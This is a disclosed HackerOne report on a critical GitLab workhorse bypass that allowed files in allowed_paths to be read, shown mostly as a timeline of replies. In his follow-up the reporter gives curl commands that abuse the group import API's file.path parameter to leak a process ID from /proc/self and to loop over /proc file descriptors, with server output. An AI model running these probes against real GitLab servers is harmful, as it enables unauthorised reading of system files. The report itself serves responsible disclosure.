---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/information-disclosure
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Information Disclosure"
enriched: true
date: 2020-06-08
submitted: 2020-04-15T14:59:54.154Z
bounty_usd: 10000
votes: 410
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "vakzz"
source: "https://hackerone.com/reports/850447"
title: "gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read"
---
# gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read

> **Severity:** Critical | **Bounty:** 10,000 USD | **Votes:** 410 | **Program:** GitLab | **Disclosed:** 2020-06-08

- Report: [https://hackerone.com/reports/850447](https://hackerone.com/reports/850447)
- CWE: Information Disclosure
- Submitted: 2020-04-15T14:59:54.154Z

## Timeline

- **Report Filed**
- **2020-04-15** @gitlab-securitybot: Hi @vakzz,

Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 20 business days with an update.

Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **2020-04-16** @jmatos_bgtvf: Removed
- **Report Triaged**
- **Bounty Awarded**
- **2020-05-04** @vakzz: Hi @jmatos_bgtvf,

Just a quick update on some other findings that could effect this issue. Instead of iterating through all the numbers to find a valid pid, it can be found using an info leak in the group import API:

```bash
curl -H "Authorization: Bearer $TOKEN_R" -F 'lala=@/tmp/lala.txt' 'https://gitlab.com/api/v4/groups/import?path=group4&name=group4&file.path=/proc/self'
{"message":"insecure path used '/proc/9348'"}
```

This could also be used to try and determine the next valid file descriptor:
```
while true; do curl -H "Authorization: Bearer $TOKEN_R" -F 'lala=@/tmp/lala.txt' 'https://gitlab.com/api/v4/groups/import?path=group4&name=group4&file.path=/proc/9348/fd/145' ; done

{"message":"500 Internal Server Error"}{"message":"500 Internal Server Error"}{"message":"500 Internal Server Error"}{"message":"500 Internal Server Error"}{"message":"500 Internal Server Error"}{"message":"500 Internal Server Error"}{"message":"500 Internal Server Error"}{"message":"500 Internal Server Error"}{"message":"500 Internal Server Error"}{"message":"500 Internal Server Error"}{"message":"500 Internal Server Error"}{"message":"500 Internal Server Error"}{"message":"insecure path used '/var/log/gitlab/gitlab-rails/database_load_balancing.log'"}
```  

Also I see this has been fixed in v12.10.2, had a look and could not see any bypasses. I like how the path from the jwt token is now being used where possible, should help prevent this type of attack.

Cheers,
Will
- **2020-05-04** @vdesousa: Hello @vakzz ,

Thanks for your update, I'm forwarding it to our engineering team.

Best regards,
Vitor
Security Team | GitLab Inc.
- **2020-05-09** @vakzz: Hi @jmatos_bgtvf (and @vdesousa),

Just checking in, I think this was resolved in the last security release or is it waiting for https://gitlab.com/gitlab-org/gitlab-workhorse/-/issues/261?

Cheers,
Will
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
